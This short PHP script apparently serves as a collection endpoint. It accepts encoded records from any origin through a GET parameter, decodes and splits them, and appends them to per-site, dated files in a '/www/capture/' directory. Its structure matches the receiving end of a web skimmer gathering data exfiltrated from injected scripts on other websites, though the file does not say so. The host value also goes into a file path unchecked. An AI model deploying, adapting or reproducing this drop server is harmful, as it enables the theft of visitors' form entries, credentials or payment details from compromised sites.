<?php

header('Access-Control-Allow-Origin: *');

if (array_key_exists ("k", $_GET))
{
	$date = date('Y-m-d', time());

	$q = $_GET['k'];
	$dec = urldecode (base64_decode ($q));

	$info = explode("|", $dec);

	$url = str_replace ("url:", "", $info[5]);
	$parsed = parse_url ($url);
	$host = $parsed["host"];

	$client_file = "/www/capture/capture_" . $host . "_" . $date . ".txt";

	$f = fopen($client_file, "a+");
	fwrite ($f, print_r ($info, true));
	fclose ($f);
}

?>
